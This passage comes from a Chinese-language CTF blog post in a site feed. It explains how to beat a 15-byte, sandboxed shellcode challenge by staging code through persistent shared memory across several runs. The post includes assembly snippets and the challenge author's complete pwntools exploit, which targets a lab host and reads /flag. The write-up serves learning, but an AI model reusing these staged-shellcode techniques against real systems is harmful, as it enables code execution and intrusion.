class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有几个严苛的条件</p><ol><li>只能读取15个字节作为shellcode</li><li>沙盒严格限制</li><li>shellcode执行前覆盖所有的寄存器</li></ol><p>官方给出的解是利用shm(共享内存,kernelpwn中应该遇见过),shm有一个特点就是<strong>其持久存在</strong>,创建的共享内存只要不主动取消或者关机就会一直存在</p><p>利用这一点可以多次运行程序每次完成一个任务最终完成利用</p><ol><li>申请一段可写可执行的共享内存,由于远程环境是干净的docker,于是返回的shmid一定是0</li><li>将第一步申请的内存附加到进程,并写入shellcode</li><li>将第一步申请的内存附加到进程,跳转到shellcode执行</li></ol><p>整个过程被分解为这三个部分,剩下的就是shellcode的构造,这部分也并不简单</p><p>首当其冲的就是控制参数寄存器,但15个字节显然还是捉襟见肘,所以可以利用程序自带的那部分通过rax复制的代码,首先清零rax,跳转到前方清空其他寄存器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shl eax, 28</span><br><span class="line">jo $-0x30</span><br></pre></td></tr></table></figure><p>由于操作eax寄存器会自动置零rax高32位,同时由于左移操作存在溢出,所以下面的jo会跳转执行</p><p>清零能够为接下来的工作缩短一些字节</p><ol><li><p>```asm<br>mov al, 0x1d /<em> shmget </em>/<br>inc esi<br>mov dx, 0777<br>syscall</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   对于shmget第一个参数key可以让其为0不理会,第二个参数会自动页对齐,第三个参数权限管理则需要更多的字节</span><br><span class="line"></span><br><span class="line">2. ```asm</span><br><span class="line">   mov dh, 0x80</span><br><span class="line">   mov al, 0x1e /* shmat */</span><br><span class="line">   syscall</span><br><span class="line">   xchg rsi, rax</span><br><span class="line">   syscall</span><br></pre></td></tr></table></figure><p>由于上一步的shmget一定返回0,所以shmat的第一个参数可以不理会,第二个参数也可以为零让系统自动选择,第三个参数是为接下来的read做准备以及设置必要的flag标志位</p><p>shmat之后,交换rsi与rax,因为此时rax是共享内存地址,rsi是0,交换之后正好是从标准输入读取到共享内存</p></li><li><p>```asm<br>mov dh, 0x80<br>mov al, 0x1e /<em> shmat </em>/<br>syscall<br>jmp rax</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   此时再次附加之前的内存,并跳转到执行</span><br><span class="line"></span><br><span class="line">最终exp(来自出题人)</span><br><span class="line"></span><br><span class="line">```py</span><br><span class="line">from pwn import *</span><br><span class="line">import time</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">context.binary = &quot;./sc3&quot;</span><br><span class="line">context.terminal = [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;]</span><br><span class="line"></span><br><span class="line">IN_DEBUG = False</span><br><span class="line">gdb_args = &quot;&quot;&quot;</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">def interrupt(io):</span><br><span class="line">    global IN_DEBUG</span><br><span class="line">    if IN_DEBUG:</span><br><span class="line">        gdb.attach(io, gdb_args)</span><br><span class="line"></span><br><span class="line">def tob(a):</span><br><span class="line">    if isinstance(a, str):</span><br><span class="line">        return bytes(a, encoding=&quot;latin1&quot;)</span><br><span class="line">    elif isinstance(a, bytes) or isinstance(a, bytearray):</span><br><span class="line">        return a</span><br><span class="line">    else:</span><br><span class="line">        return bytes(str(a), encoding=&quot;latin1&quot;)</span><br><span class="line"></span><br><span class="line">def gen_io() -&gt; tube:</span><br><span class="line">    global IN_DEBUG</span><br><span class="line">    if len(sys.argv) &lt;= 1 or sys.argv[1] == &quot;l&quot;:</span><br><span class="line">        return process(context.binary.path)</span><br><span class="line">    elif sys.argv[1] == &quot;m&quot;:</span><br><span class="line">        IN_DEBUG = True</span><br><span class="line">        return process(context.binary.path)</span><br><span class="line">    elif sys.argv[1] == &quot;r&quot;:</span><br><span class="line">        return remote(&quot;2ee301ba5b1b.target.yijinglab.com&quot;, 52027)</span><br><span class="line">    </span><br><span class="line">    raise Exception(f&quot;Unknown option &#123;sys.argv[1]&#125;&quot;)</span><br><span class="line"></span><br><span class="line">pre_sc = asm(</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    mov eax, 7</span><br><span class="line">    mov ecx, 0</span><br><span class="line">    cpuid</span><br><span class="line">    shr ebx, 16</span><br><span class="line">    and ebx, 1</span><br><span class="line">    jz clear_mm</span><br><span class="line">    clear_zmm:</span><br><span class="line">        vpxorq zmm16, zmm16, zmm16</span><br><span class="line">        vpxorq zmm17, zmm17, zmm17</span><br><span class="line">        vpxorq zmm18, zmm18, zmm18</span><br><span class="line">        vpxorq zmm19, zmm19, zmm19</span><br><span class="line">        vpxorq zmm20, zmm20, zmm20</span><br><span class="line">        vpxorq zmm21, zmm21, zmm21</span><br><span class="line">        vpxorq zmm22, zmm22, zmm22</span><br><span class="line">        vpxorq zmm23, zmm23, zmm23</span><br><span class="line">        vpxorq zmm24, zmm24, zmm24</span><br><span class="line">        vpxorq zmm25, zmm25, zmm25</span><br><span class="line">        vpxorq zmm26, zmm26, zmm26</span><br><span class="line">        vpxorq zmm27, zmm27, zmm27</span><br><span class="line">        vpxorq zmm28, zmm28, zmm28</span><br><span class="line">        vpxorq zmm29, zmm29, zmm29</span><br><span class="line">        vpxorq zmm30, zmm30, zmm30</span><br><span class="line">        vpxorq zmm31, zmm31, zmm31</span><br><span class="line">    clear_mm:</span><br><span class="line">        vzeroall</span><br><span class="line">        mov rax, 0x123456789abcdef0</span><br><span class="line">        mov rbx, rax</span><br><span class="line">        mov rcx, rax</span><br><span class="line">        mov rdx, rax</span><br><span class="line">        mov rdi, rax</span><br><span class="line">        mov rsi, rax</span><br><span class="line">        mov rbp, rax</span><br><span class="line">        mov rsp, rax</span><br><span class="line">        mov r8, rax</span><br><span class="line">        mov r9, rax</span><br><span class="line">        mov r10, rax</span><br><span class="line">        mov r11, rax</span><br><span class="line">        mov r12, rax</span><br><span class="line">        mov r13, rax</span><br><span class="line">        mov r14, rax</span><br><span class="line">        mov r15, rax</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">print(&quot;&quot;.join([&quot;\\x&quot; + hex(v)[2:].rjust(2, &#x27;0&#x27;) for v in pre_sc]))</span><br><span class="line"></span><br><span class="line">sc3_pre = asm(</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    shl eax, 28</span><br><span class="line">    jo $-0x30</span><br><span class="line">    mov al, 0x1d /* shmget */</span><br><span class="line">    inc esi</span><br><span class="line">    mov dx, 0777</span><br><span class="line">    syscall</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">sc3 = asm(</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    shl eax, 28</span><br><span class="line">    jo $-0x30</span><br><span class="line">    mov dh, 0x80</span><br><span class="line">    mov al, 0x1e /* shmat */</span><br><span class="line">    syscall</span><br><span class="line">    xchg rsi, rax</span><br><span class="line">    syscall</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">sc3_post = asm(</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    shl eax, 28</span><br><span class="line">    jo $-0x30</span><br><span class="line">    mov dh, 0x80</span><br><span class="line">    mov al, 0x1e /* shmat */</span><br><span class="line">    syscall</span><br><span class="line">    jmp rax</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">main_sc = asm(</span><br><span class="line">    f&quot;&quot;&quot;</span><br><span class="line">    lea rsp, [rip + 0x800]</span><br><span class="line">    mov r8, rsp</span><br><span class="line">    add r8, 0x200</span><br><span class="line">    &#123;shellcraft.open(&quot;/flag&quot;, 0)&#125;</span><br><span class="line">    &#123;shellcraft.read(&quot;rax&quot;, &quot;r8&quot;, 0x100)&#125;</span><br><span class="line">    &#123;shellcraft.write(1, &quot;r8&quot;, 0x100)&#125;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">print(len(sc3_pre))</span><br><span class="line">print(len(sc3))</span><br><span class="line">print(len(sc3_post))</span><br><span class="line"></span><br><span class="line">io = gen_io()</span><br><span class="line">interrupt(io)</span><br><span class="line"></span><br><span class="line"># pause()</span><br><span class="line">io.sendafter(b&quot;shellcode: &quot;, sc3_pre)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line">io = gen_io()</span><br><span class="line">interrupt(io)</span><br><span class="line">io.sendafter(b&quot;shellcode: &quot;, sc3)</span><br><span class="line">pause()</span><br><span class="line">io.send(main_sc)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line">io = gen_io()</span><br><span class="line">interrupt(io)</span><br><span class="line">io.sendafter(b&quot;shellcode: &quot;, sc3_post)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    <summary type="html">有意思的题目</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="杂题" scheme="https://ixout.github.io/tags/%E6%9D%82%E9%A2%98/"/>
    
  </entry>
  
</feed>
